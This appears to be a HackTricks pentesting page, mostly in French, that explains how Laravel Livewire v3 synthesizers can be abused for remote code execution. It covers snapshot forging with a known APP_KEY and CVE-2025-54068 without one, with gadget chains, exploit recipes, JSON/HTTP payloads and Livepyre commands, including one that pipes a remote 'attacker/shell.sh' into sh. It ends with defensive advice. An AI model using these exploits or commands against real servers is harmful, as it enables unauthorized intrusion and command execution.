# Laravel Livewire Hydration & Synthesizer Abuse

{{#include ../../banners/hacktricks-training.md}}

## Récapitulatif de la machine d'état de Livewire

Les composants Livewire 3 échangent leur état via des **snapshots** qui contiennent `data`, `memo`, et une checksum. À chaque POST vers `/livewire/update`, le snapshot JSON est réhydraté côté serveur et les `calls`/`updates` en file d'attente sont exécutés.
```php
class Checksum {
static function verify($snapshot) {
$checksum = $snapshot['checksum'];
unset($snapshot['checksum']);
if ($checksum !== self::generate($snapshot)) {
throw new CorruptComponentPayloadException;
}
}

static function generate($snapshot) {
return hash_hmac('sha256', json_encode($snapshot), $hashKey);
}
}
```
Toute personne disposant de `APP_KEY` (utilisé pour dériver `$hashKey`) peut donc forger des snapshots arbitraires en recomputant le HMAC.

Les propriétés complexes sont encodées sous forme de **tuples synthétiques** détectés par `Livewire\Drawer\BaseUtils::isSyntheticTuple()` ; chaque tuple est `[value, {"s":"<key>", ...meta}]`. Le noyau d'hydratation délègue simplement chaque tuple au synth sélectionné dans `HandleComponents::$propertySynthesizers` et parcourt récursivement les enfants :
```php
protected function hydrate($valueOrTuple, $context, $path)
{
if (! Utils::isSyntheticTuple($value = $tuple = $valueOrTuple)) return $value;
[$value, $meta] = $tuple;
$synth = $this->propertySynth($meta['s'], $context, $path);
return $synth->hydrate($value, $meta, fn ($name, $child)
=> $this->hydrate($child, $context, "{$path}.{$name}"));
}
```
Cette conception récursive transforme Livewire en un **moteur générique d'instanciation d'objets** dès qu'un attaquant contrôle soit les métadonnées d'un tuple, soit un tuple imbriqué traité lors de la récursion.

## Synthétiseurs qui fournissent des primitives de gadget

| Synthesizer | Attacker-controlled behaviour |
|-------------|--------------------------------|
| **CollectionSynth (`clctn`)** | Instancie `new $meta['class']($value)` après avoir ré-hydraté chaque enfant. Toute classe avec un constructeur acceptant un tableau peut être créée, et chaque élément peut lui-même être un tuple synthétique.
| **FormObjectSynth (`form`)** | Appelle `new $meta['class']($component, $path)`, puis assigne chaque propriété publique depuis des enfants contrôlés par l'attaquant via `$hydrateChild`. Des constructeurs acceptant deux paramètres faiblement typés (ou des arguments par défaut) suffisent pour atteindre des propriétés publiques arbitraires.
| **ModelSynth (`mdl`)** | Quand `key` est absent des meta il exécute `return new $class;`, permettant l'instanciation sans argument de toute classe sous contrôle de l'attaquant.

Parce que les synths invoquent `$hydrateChild` sur chaque élément imbriqué, des graphes de gadgets arbitraires peuvent être construits en empilant des tuples récursivement.

## Forging snapshots when `APP_KEY` is known

1. Capturez une requête `/livewire/update` légitime et décodez `components[0].snapshot`.
2. Injectez des tuples imbriqués pointant vers des classes gadget et recalculer `checksum = hash_hmac('sha256', json_encode(snapshot_without_checksum), APP_KEY)`.
3. Ré-encodez le snapshot, laissez `_token`/`memo` inchangés, puis rejouez la requête.

A minimal proof of execution uses **Guzzle's `FnStream`** and **Flysystem's `ShardedPrefixPublicUrlGenerator`**. Un tuple instancie `FnStream` avec des données de constructeur `{ "__toString": "phpinfo" }`, le suivant instancie `ShardedPrefixPublicUrlGenerator` avec `[FnStreamInstance]` en tant que `$prefixes`. Quand Flysystem convertit chaque préfixe en `string`, PHP invoque le callable `__toString` fourni par l'attaquant, appelant ainsi n'importe quelle fonction sans arguments.

### From function calls to full RCE

En tirant parti des primitives d'instanciation de Livewire, Synacktiv a adapté la chaîne phpggc `Laravel/RCE4` de sorte que l'hydratation démarre un objet dont l'état public Queueable déclenche une désérialisation :

1. **Queueable trait** – tout objet utilisant `Illuminate\Bus\Queueable` expose `$chained` public et exécute `unserialize(array_shift($this->chained))` dans `dispatchNextJobInChain()`.
2. **BroadcastEvent wrapper** – `Illuminate\Broadcasting\BroadcastEvent` (ShouldQueue) est instancié via `CollectionSynth` / `FormObjectSynth` avec `$chained` public rempli.
3. **phpggc Laravel/RCE4Adapted** – le blob sérialisé stocké dans `$chained[0]` construit `PendingBroadcast -> Validator -> SerializableClosure\Serializers\Signed`. `Signed::__invoke()` appelle finalement `call_user_func_array($closure, $args)`, permettant `system($cmd)`.
4. **Termination discrète** – en fournissant un second callable `FnStream` tel que `[new Laravel\Prompts\Terminal(), 'exit']`, la requête se termine par `exit()` au lieu d'une exception bruyante, gardant la réponse HTTP propre.

### Automatisation de la falsification des snapshots

`synacktiv/laravel-crypto-killer` inclut désormais un mode `livewire` qui assemble le tout :
```bash
./laravel_crypto_killer.py exploit -e livewire -k base64:APP_KEY \
-j request.json --function system -p "bash -c 'id'"
```
L'outil analyse le snapshot capturé, injecte les tuples gadget, recalcule le checksum et affiche une payload `/livewire/update` prête à être envoyée.

## CVE-2025-54068 – RCE sans `APP_KEY`

Selon l'avis du fournisseur, le problème affecte Livewire v3 (>= 3.0.0-beta.1 et < 3.6.3) et est spécifique à v3.

Les `updates` sont fusionnés dans l'état du composant **après** que le checksum du snapshot a été validé. Si une propriété à l'intérieur du snapshot est (ou devient) un tuple synthétique, Livewire réutilise ses meta lors de l'hydratation de la valeur update contrôlée par l'attaquant :
```php
protected function hydrateForUpdate($raw, $path, $value, $context)
{
$meta = $this->getMetaForPath($raw, $path);
if ($meta) {
return $this->hydrate([$value, $meta], $context, $path);
}
}
```
Exploit recipe:

1. Trouver un composant Livewire avec une propriété publique non typée (par ex., `public $count;`).
2. Envoyer une mise à jour qui fixe cette propriété à `[]`. Le snapshot suivant la stocke maintenant comme `[[], {"s": "arr"}]`.

A minimal type-juggling flow looks like this:

```http
POST /livewire/update
...
"updates": {"count": []}
```

Then the next snapshot stores a tuple that keeps the `arr` synthesizer metadata:

```json
"count": [[], {"s": "arr"}]
```

3. Craft another `updates` payload where that property contains a deeply nested array embedding tuples such as `[ <payload>, {"s":"clctn","class":"GuzzleHttp\\Psr7\\FnStream"} ]`.
4. During recursion, `hydrate()` evaluates each nested child independently, so attacker-chosen synth keys/classes are honoured even though the outer tuple and checksum never changed.
5. Reuse the same `CollectionSynth`/`FormObjectSynth` primitives to instantiate a Queueable gadget whose `$chained[0]` contains the phpggc payload. Livewire processes the forged updates, invokes `dispatchNextJobInChain()`, and reaches `system(<cmd>)` without knowing `APP_KEY`.

Key reasons this works:

- `updates` are not covered by the snapshot checksum.
- `getMetaForPath()` fait confiance aux métadonnées du synthétiseur qui existaient déjà pour cette propriété, même si l'attaquant l'avait auparavant forcée à devenir un tuple via typage faible.
- La récursion combinée au typage faible permet à chaque tableau imbriqué d'être interprété comme un tout nouveau tuple, de sorte que des synth keys arbitraires et des classes arbitraires atteignent finalement l'hydratation.

## Livepyre – exploitation de bout en bout

[Livepyre](https://github.com/synacktiv/Livepyre) automatise à la fois le CVE sans APP_KEY et la voie du snapshot signé :

- Identifie la version de Livewire déployée en analysant `<script src="/livewire/livewire.js?id=HASH">` et en associant le hash aux releases vulnérables.
- Collecte des snapshots de référence en rejouant des actions bénignes et en extrayant `components[].snapshot`.
- Génère soit un payload `updates` seulement (CVE-2025-54068), soit un snapshot forgé (si APP_KEY connu) incorporant la chaîne phpggc.
- Si aucun paramètre de type objet n'est trouvé dans un snapshot, Livepyre se rabat sur le brute-forcing de paramètres candidats pour atteindre une propriété coercible.

Typical usage:
```bash
# CVE-2025-54068, unauthenticated
python3 Livepyre.py -u https://target/livewire/component -f system -p id

# Signed snapshot exploit with known APP_KEY
python3 Livepyre.py -u https://target/livewire/component -a base64:APP_KEY \
-f system -p "bash -c 'curl attacker/shell.sh|sh'"
```
`-c/--check` exécute une sonde non destructrice, `-F` ignore le version gating, `-H` et `-P` ajoutent des en-têtes personnalisés ou des proxies, et `--function/--param` personnalisent la fonction PHP invoquée par le gadget chain.

## Considérations défensives

- Effectuez la mise à niveau vers des builds Livewire corrigés (>= 3.6.4 selon le bulletin du vendor) et déployez le correctif fournisseur pour CVE-2025-54068.
- Évitez les propriétés publiques faiblement typées dans les composants Livewire ; des types scalaires explicites empêchent que les valeurs des propriétés soient coercées en arrays/tuples.
- Enregistrez uniquement les synthesizers dont vous avez réellement besoin et traitez les métadonnées contrôlées par l'utilisateur (`$meta['class']`) comme non fiables.
- Rejetez les mises à jour qui changent le type JSON d'une propriété (p.ex., scalar -> array) sauf si explicitement autorisées, et re-dérivez le synth metadata au lieu de réutiliser des tuples obsolètes.
- Renouvelez `APP_KEY` rapidement après toute divulgation car il permet le offline snapshot forging, peu importe les correctifs appliqués au code-base.

## Références

- [Synacktiv – Livewire: Remote Command Execution via Unmarshaling](https://www.synacktiv.com/publications/livewire-execution-de-commandes-a-distance-via-unmarshaling.html)
- [synacktiv/laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer)
- [synacktiv/Livepyre](https://github.com/synacktiv/Livepyre)
- [GHSA-29cq-5w36-x7w3 – Livewire v3 RCE advisory](https://github.com/livewire/livewire/security/advisories/GHSA-29cq-5w36-x7w3)

{{#include ../../banners/hacktricks-training.md}}
